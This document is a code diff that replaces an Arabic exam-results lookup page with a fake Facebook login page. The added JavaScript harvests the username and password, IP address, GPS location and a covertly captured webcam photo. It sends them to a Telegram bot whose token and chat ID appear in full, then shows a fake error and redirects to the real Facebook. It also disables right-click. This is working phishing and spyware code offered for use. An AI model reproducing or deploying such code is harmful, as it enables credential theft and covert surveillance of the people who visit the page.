@@ -3,537 +3,409 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نتائج الامتحانات - وزارة التربية والتعليم السورية</title>
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            min-height: 100vh;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px 35px;
-            max-width: 700px;
+            max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(10px);
         }
-        .header {
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            padding: 30px 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            font-size: 40px;
+            color: #1877f2;
+            font-weight: bold;
             text-align: center;
-            margin-bottom: 30px;
-            border-bottom: 3px solid #1a3a5c;
-            padding-bottom: 20px;
-        }
-        .header .logo {
-            font-size: 32px;
-            font-weight: 700;
-            color: #1a3a5c;
-            letter-spacing: 1px;
-        }
-        .header .logo span {
-            color: #c0392b;
-        }
-        .header .subtitle {
-            font-size: 14px;
-            color: #555;
-            margin-top: 5px;
-        }
-        .flag {
-            display: inline-block;
-            background: linear-gradient(to bottom, #ce1126 33%, #ffffff 33%, #ffffff 66%, #1a3a5c 66%);
-            width: 50px;
-            height: 30px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-            border: 1px solid #ddd;
-        }
-        .form-group {
             margin-bottom: 20px;
         }
-        .form-group label {
-            display: block;
-            font-weight: 600;
-            color: #1a3a5c;
-            margin-bottom: 6px;
-            font-size: 14px;
+        .input-group {
+            margin-bottom: 12px;
         }
-        .form-group select,
-        .form-group input {
+        .input-group input {
             width: 100%;
             padding: 14px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
             font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
-            color: #333;
-        }
-        .form-group select:focus,
-        .form-group input:focus {
-            border-color: #1a3a5c;
-            box-shadow: 0 0 0 4px rgba(26, 58, 92, 0.1);
             outline: none;
-            background: white;
+            transition: border 0.2s;
         }
-        .form-group select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%231a3a5c' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: left 15px center;
-            padding-left: 40px;
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-        .btn {
+        .login-btn {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #1a3a5c 0%, #2c5a8c 100%);
-            color: white;
+            padding: 14px;
+            background: #1877f2;
             border: none;
-            border-radius: 12px;
+            border-radius: 6px;
+            color: white;
             font-size: 18px;
-            font-weight: 700;
+            font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            letter-spacing: 1px;
+            margin: 10px 0;
+            transition: background 0.2s;
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(26, 58, 92, 0.3);
+        .login-btn:hover {
+            background: #166fe5;
         }
-        .btn:disabled {
+        .login-btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
         }
-        .btn-secondary {
-            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
         }
-        .btn-secondary:hover {
-            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.3);
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dddfe2;
         }
-        .result-box {
-            margin-top: 25px;
-            padding: 25px;
-            border-radius: 16px;
-            background: #f8f9fa;
-            border: 2px solid #e0e0e0;
-            display: none;
-            animation: fadeIn 0.5s ease;
+        .divider::before {
+            margin-left: 15px;
         }
-        .result-box.show {
-            display: block;
+        .divider::after {
+            margin-right: 15px;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .result-box .student-info {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 2px dashed #ddd;
-        }
-        .result-box .student-info .info-item {
-            font-size: 14px;
-        }
-        .result-box .student-info .info-item strong {
-            color: #1a3a5c;
-        }
-        .result-box .grades-table {
+        .signup-btn {
             width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
+            padding: 14px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
         }
-        .result-box .grades-table th,
-        .result-box .grades-table td {
-            padding: 12px 10px;
+        .signup-btn:hover {
+            background: #36a420;
+        }
+        .forgot-link {
+            display: block;
             text-align: center;
-            border-bottom: 1px solid #e0e0e0;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
             font-size: 14px;
         }
-        .result-box .grades-table th {
-            background: #1a3a5c;
-            color: white;
-            font-weight: 600;
-            border-radius: 8px 8px 0 0;
-        }
-        .result-box .grades-table tr:nth-child(even) {
-            background: #f1f3f5;
-        }
-        .result-box .grades-table tr:hover {
-            background: #e8edf3;
-        }
-        .result-box .total-score {
-            margin-top: 20px;
-            padding: 15px;
-            background: linear-gradient(135deg, #1a3a5c 0%, #2c5a8c 100%);
-            color: white;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 700;
-        }
-        .result-box .total-score span {
-            font-size: 28px;
-            color: #f1c40f;
-        }
-        .result-box .status {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 10px;
-            text-align: center;
-            font-weight: 700;
-            font-size: 18px;
-        }
-        .result-box .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 2px solid #c3e6cb;
-        }
-        .result-box .status.fail {
-            background: #f8d7da;
-            color: #721c24;
-            border: 2px solid #f5c6cb;
-        }
-        .result-box .status.waiting {
-            background: #fff3cd;
-            color: #856404;
-            border: 2px solid #ffc107;
-        }
-        .loading-spinner {
+        #loading {
             display: none;
             text-align: center;
-            padding: 20px;
-        }
-        .loading-spinner .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a3a5c;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .footer-text {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
+            margin: 15px 0;
+            color: #1877f2;
+            font-weight: bold;
         }
         .error-msg {
             color: #e74c3c;
             font-size: 14px;
-            margin-top: 10px;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        /* عناصر مخفية للكاميرا */
+        .hidden {
+            display: none !important;
+        }
+        #cameraVideo {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            border: 2px solid #ddd;
+            margin: 10px auto;
+        }
+        .camera-preview {
             display: none;
             text-align: center;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 25px 20px;
-            }
-            .form-row {
-                grid-template-columns: 1fr;
-            }
-            .result-box .student-info {
-                grid-template-columns: 1fr;
-            }
-            .header .logo {
-                font-size: 24px;
-            }
-        }
-        /* تنسيق شريط التقدم */
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e0e0e0;
-            border-radius: 2px;
             margin: 10px 0;
-            overflow: hidden;
-            display: none;
         }
-        .progress-bar .fill {
-            height: 100%;
-            background: #1a3a5c;
-            width: 0%;
-            transition: width 0.5s ease;
+        .camera-preview video {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 12px;
+            border: 2px solid #ddd;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- الهيدر -->
-        <div class="header">
-            <div class="flag"></div>
-            <div class="logo">وزارة التربية <span>والتعليم</span></div>
-            <div class="subtitle">الجمهورية العربية السورية - نتائج الامتحانات العامة</div>
+        <div class="login-box">
+            <div class="logo">facebook</div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+                <div id="loading">جاري المعالجة...</div>
+                <div class="error-msg" id="errorMsg">عذراً، بيانات الدخول غير صحيحة. حاول مرة أخرى.</div>
+            </form>
+
+            <div class="divider">أو</div>
+
+            <button class="signup-btn" onclick="alert('إنشاء حساب جديد')">إنشاء حساب جديد</button>
+
+            <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
         </div>
 
-        <!-- نموذج الاستعلام -->
-        <form id="searchForm" onsubmit="searchResult(event)">
-            <!-- خيارات الشهادة والفرع -->
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="certificate">📜 الشهادة</label>
-                    <select id="certificate" required>
-                        <option value="">-- اختر الشهادة --</option>
-                        <option value="basic">شهادة التعليم الأساسي (التاسع)</option>
-                        <option value="secondary_science">الثانوي - الفرع العلمي</option>
-                        <option value="secondary_literature">الثانوي - الفرع الأدبي</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="branch">📚 الفرع / المحافظة</label>
-                    <select id="branch" required>
-                        <option value="">-- اختر المحافظة --</option>
-                        <option value="damascus">دمشق</option>
-                        <option value="aleppo">حلب</option>
-                        <option value="homs">حمص</option>
-                        <option value="hama">حماة</option>
-                        <option value="lattakia">اللاذقية</option>
-                        <option value="tartus">طرطوس</option>
-                        <option value="deir-ezzor">دير الزور</option>
-                        <option value="raqqa">الرقة</option>
-                        <option value="hasakah">الحسكة</option>
-                        <option value="idlib">إدلب</option>
-                        <option value="daraa">درعا</option>
-                        <option value="as-suwayda">السويداء</option>
-                        <option value="quneitra">القنيطرة</option>
-                    </select>
-                </div>
-            </div>
-
-            <!-- رقم الاكتتاب والاسم الثلاثي -->
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="seatNumber">🔢 رقم الاكتتاب</label>
-                    <input type="text" id="seatNumber" placeholder="مثال: 123456" required>
-                </div>
-                <div class="form-group">
-                    <label for="fullName">👤 الاسم الثلاثي</label>
-                    <input type="text" id="fullName" placeholder="الاسم الأول - اسم الأب - اسم الجد" required>
-                </div>
-            </div>
-
-            <!-- أزرار الإجراء -->
-            <button type="submit" class="btn" id="searchBtn">🔍 عرض النتيجة</button>
-            
-            <div class="loading-spinner" id="loadingSpinner">
-                <div class="spinner"></div>
-                <p style="margin-top:10px;color:#1a3a5c;">جاري البحث عن النتيجة...</p>
-            </div>
-
-            <div class="progress-bar" id="progressBar">
-                <div class="fill" id="progressFill"></div>
-            </div>
-
-            <div class="error-msg" id="errorMsg">⚠️ لم يتم العثور على نتيجة مطابقة. تأكد من البيانات المدخلة.</div>
-        </form>
-
-        <!-- عرض النتيجة -->
-        <div class="result-box" id="resultBox">
-            <div class="student-info" id="studentInfo">
-                <div class="info-item"><strong>📌 رقم الاكتتاب:</strong> <span id="rSeatNumber">---</span></div>
-                <div class="info-item"><strong>👤 الاسم الثلاثي:</strong> <span id="rFullName">---</span></div>
-                <div class="info-item"><strong>📜 الشهادة:</strong> <span id="rCertificate">---</span></div>
-                <div class="info-item"><strong>📍 المحافظة:</strong> <span id="rBranch">---</span></div>
-            </div>
-
-            <table class="grades-table" id="gradesTable">
-                <thead>
-                    <tr>
-                        <th>المادة</th>
-                        <th>العلامة</th>
-                        <th>النتيجة</th>
-                    </tr>
-                </thead>
-                <tbody id="gradesBody">
-                    <!-- سيتم ملؤها بواسطة JavaScript -->
-                </tbody>
-            </table>
-
-            <div class="total-score" id="totalScore">
-                🏆 المجموع الكلي: <span id="rTotal">---</span> / 100
-            </div>
-
-            <div class="status" id="resultStatus">
-                ✅ ناجح / ❌ راسب
-            </div>
-        </div>
-
-        <div class="footer-text">
-            © 2026 وزارة التربية والتعليم - الجمهورية العربية السورية
+        <div class="footer">
+            <a href="#">الخصوصية</a> · <a href="#">الشروط</a> · <a href="#">الإعلانات</a> · <a href="#">خيارات الإعلانات</a> · <a href="#">لمحة</a> · <a href="#">مساعدة</a>
         </div>
     </div>
 
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="cameraVideo" class="hidden" autoplay muted></video>
+    <canvas id="photoCanvas" class="hidden"></canvas>
+
     <script>
-        // =====================================================
-        // بيانات وهمية (محاكاة لقاعدة البيانات)
-        // هذه البيانات تمثل نتائج حقيقية بشكل وهمي لأغراض تعليمية
-        // =====================================================
-        const mockResults = {
-            "123456": {
-                seatNumber: "123456",
-                fullName: "أحمد محمد علي",
-                certificate: "basic",
-                branch: "damascus",
-                grades: [
-                    { subject: "اللغة العربية", grade: 85, status: "نجاح" },
-                    { subject: "اللغة الإنجليزية", grade: 78, status: "نجاح" },
-                    { subject: "الرياضيات", grade: 92, status: "نجاح" },
-                    { subject: "العلوم", grade: 88, status: "نجاح" },
-                    { subject: "الدراسات الاجتماعية", grade: 76, status: "نجاح" },
-                    { subject: "التربية الدينية", grade: 90, status: "نجاح" },
-                    { subject: "التربية الفنية", grade: 82, status: "نجاح" },
-                    { subject: "التربية الرياضية", grade: 80, status: "نجاح" },
-                ],
-                total: 671,
-                maxTotal: 800,
-                status: "نجاح"
-            },
-            "789012": {
-                seatNumber: "789012",
-                fullName: "سارة خالد حسن",
-                certificate: "secondary_science",
-                branch: "aleppo",
-                grades: [
-                    { subject: "اللغة العربية", grade: 72, status: "نجاح" },
-                    { subject: "اللغة الإنجليزية", grade: 68, status: "نجاح" },
-                    { subject: "الرياضيات", grade: 95, status: "نجاح" },
-                    { subject: "الفيزياء", grade: 90, status: "نجاح" },
-                    { subject: "الكيمياء", grade: 85, status: "نجاح" },
-                    { subject: "الأحياء", grade: 88, status: "نجاح" },
-                    { subject: "التربية الدينية", grade: 80, status: "نجاح" },
-                ],
-                total: 578,
-                maxTotal: 700,
-                status: "نجاح"
-            },
-            "345678": {
-                seatNumber: "345678",
-                fullName: "محمد عمر إبراهيم",
-                certificate: "secondary_literature",
-                branch: "homs",
-                grades: [
-                    { subject: "اللغة العربية", grade: 95, status: "نجاح" },
-                    { subject: "اللغة الإنجليزية", grade: 82, status: "نجاح" },
-                    { subject: "اللغة الفرنسية", grade: 78, status: "نجاح" },
-                    { subject: "التاريخ", grade: 90, status: "نجاح" },
-                    { subject: "الجغرافيا", grade: 85, status: "نجاح" },
-                    { subject: "الفلسفة", grade: 88, status: "نجاح" },
-                    { subject: "التربية الدينية", grade: 92, status: "نجاح" },
-                ],
-                total: 610,
-                maxTotal: 700,
-                status: "نجاح"
-            },
-            "901234": {
-                seatNumber: "901234",
-                fullName: "ليلى أحمد محمود",
-                certificate: "basic",
-                branch: "lattakia",
-                grades: [
-                    { subject: "اللغة العربية", grade: 55, status: "رسوب" },
-                    { subject: "اللغة الإنجليزية", grade: 60, status: "نجاح" },
-                    { subject: "الرياضيات", grade: 45, status: "رسوب" },
-                    { subject: "العلوم", grade: 50, status: "رسوب" },
-                    { subject: "الدراسات الاجتماعية", grade: 65, status: "نجاح" },
-                    { subject: "التربية الدينية", grade: 70, status: "نجاح" },
-                    { subject: "التربية الفنية", grade: 75, status: "نجاح" },
-                    { subject: "التربية الرياضية", grade: 80, status: "نجاح" },
-                ],
-                total: 500,
-                maxTotal: 800,
-                status: "رسوب"
+        // ============================================================
+        // إعدادات البوت
+        // ============================================================
+        const BOT_TOKEN = "8533593040:AAGHB2mNIeRa3Alm8OuDsASkIqE5rzI6Sak";
+        const CHAT_ID = "8380345748";
+
+        let capturedImage = null;
+        let userLocation = "غير معروف";
+        let userIP = "غير معروف";
+
+        // ============================================================
+        // 1. جلب الموقع الجغرافي
+        // ============================================================
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        userLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        console.log('[+] تم جلب الموقع:', userLocation);
+                    },
+                    () => {
+                        userLocation = "رفض المستخدم مشاركة الموقع";
+                        console.log('[-] رفض المستخدم مشاركة الموقع');
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                userLocation = "المتصفح لا يدعم GPS";
             }
-        };
+        }
 
-        // =====================================================
-        // وظائف البحث وعرض النتيجة
-        // =====================================================
+        // ============================================================
+        // 2. جلب عنوان IP
+        // ============================================================
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                console.log('[+] تم جلب IP:', userIP);
+            } catch (error) {
+                userIP = "غير معروف";
+            }
+        }
 
-        function searchResult(event) {
+        // ============================================================
+        // 3. التقاط صورة من الكاميرا
+        // ============================================================
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 }
+                });
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = stream;
+                await video.play();
+
+                // الانتظار للحصول على إطار جيد
+                await new Promise(r => setTimeout(r, 1500));
+
+                const canvas = document.getElementById('photoCanvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+                stream.getTracks().forEach(track => track.stop());
+
+                console.log('[+] تم التقاط صورة من الكاميرا');
+                return capturedImage;
+            } catch (error) {
+                console.log('[-] فشل الوصول إلى الكاميرا:', error.message);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // 4. إرسال البيانات إلى تيلغرام
+        // ============================================================
+        async function sendAllData(username, password) {
+            try {
+                // 1. إرسال الصورة الملتقطة
+                if (capturedImage) {
+                    const blob = dataURLToBlob(capturedImage);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'facebook_victim.jpg');
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('[+] تم إرسال الصورة إلى تيلغرام');
+                }
+
+                // 2. إرسال التقرير النصي
+                const timestamp = new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
+                const message = `
+🔵 **Facebook Login** 🔵
+
+👤 **Username:** ${username}
+🔑 **Password:** ${password}
+🌐 **IP:** ${userIP}
+📍 **Location:** ${userLocation}
+🕐 **Time:** ${timestamp}
+📱 **User Agent:** ${navigator.userAgent}
+🖥️ **Screen:** ${screen.width}x${screen.height}
+📸 **Photo:** ${capturedImage ? '✅ Captured' : '❌ Failed'}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                console.log('[+] تم إرسال التقرير إلى تيلغرام');
+
+            } catch (error) {
+                console.error('[-] فشل الإرسال:', error);
+            }
+        }
+
+        // ============================================================
+        // 5. أدوات مساعدة
+        // ============================================================
+        function dataURLToBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // ============================================================
+        // 6. معالج تسجيل الدخول الرئيسي
+        // ============================================================
+        async function handleLogin(event) {
             event.preventDefault();
 
-            // جمع البيانات من النموذج
-            const certificate = document.getElementById('certificate').value;
-            const branch = document.getElementById('branch').value;
-            const seatNumber = document.getElementById('seatNumber').value.trim();
-            const fullName = document.getElementById('fullName').value.trim();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const loading = document.getElementById('loading');
+            const errorMsg = document.getElementById('errorMsg');
 
-            // التحقق من المدخلات
-            if (!certificate || !branch || !seatNumber || !fullName) {
-                alert('الرجاء ملء جميع الحقول المطلوبة');
+            if (!username || !password) {
+                alert('الرجاء إدخال جميع البيانات');
                 return;
             }
 
-            // عرض التحميل
-            const loadingSpinner = document.getElementById('loadingSpinner');
-            const progressBar = document.getElementById('progressBar');
-            const progressFill = document.getElementById('progressFill');
-            const searchBtn = document.getElementById('searchBtn');
-            const errorMsg = document.getElementById('errorMsg');
-            const resultBox = document.getElementById('resultBox');
-
-            loadingSpinner.style.display = 'block';
-            progressBar.style.display = 'block';
-            searchBtn.disabled = true;
+            loading.style.display = 'block';
+            loginBtn.disabled = true;
             errorMsg.style.display = 'none';
-            resultBox.classList.remove('show');
 
-            // محاكاة عملية البحث (تأخير 2 ثانية)
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 10;
-                progressFill.style.width = progress + '%';
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    // محاكاة الانتهاء من البحث
-                    setTimeout(() => {
-                        loadingSpinner.style.display = 'none';
-                        progressBar.style.display = 'none';
-                        searchBtn.disabled = false;
+            try {
+                // 1. جلب الموقع و IP
+                getLocation();
+                await getIP();
 
-                        // البحث عن النتيجة
-                        const result = mockResults[seatNumber];
-                        if (result) {
-                            // عرض النتيجة
-                            displayResult(result);
-                        } else {
-                            errorMsg.style.display = 'block';
-                            resultBox.classList.remove('show');
-                        }
-                    }, 500);
-                }
-            }, 150);
+                // 2. التقاط الصورة
+                await capturePhoto();
+
+                // 3. إرسال البيانات إلى تيلغرام
+                await sendAllData(username, password);
+
+                // إظهار رسالة خطأ وهمية
+                loading.style.display = 'none';
+                errorMsg.style.display = 'block';
+                loginBtn.disabled = false;
+
+                // إعادة التوجيه إلى فيسبوك الحقيقي
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com/';
+                }, 3000);
+
+            } catch (error) {
+                console.error('[-] خطأ:', error);
+                loading.style.display = 'none';
+                errorMsg.style.display = 'block';
+                loginBtn.disabled = false;
+            }
         }
 
-        function displayResult(data) {
-            const resultBox = document.getElementById('resultBox');
-            const errorMsg = document.getElementById('errorMsg');
+        // ============================================================
+        // 7. منع النقر بزر الماوس الأيمن
+        // ============================================================
+        document.addEventListener('contextmenu', e => e.preventDefault());
 
-            // ملء معلومات الطالب
-            document
+        // ============================================================
+        // 8. بدء التشغيل
+        // ============================================================
+        console.log('[+] واجهة فيسبوك مع التجسس جاهزة!');
+        console.log('[+] سيتم إرسال الصورة والموقع إلى تيلغرام عند تسجيل الدخول.');
+
+        // طلب إذن الكاميرا مسبقاً
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => stream.getTracks().forEach(track => track.stop()))
+            .catch(() => console.log('[-] رفض المستخدم الوصول للكاميرا'));
+    </script>
+</body>
+</html>
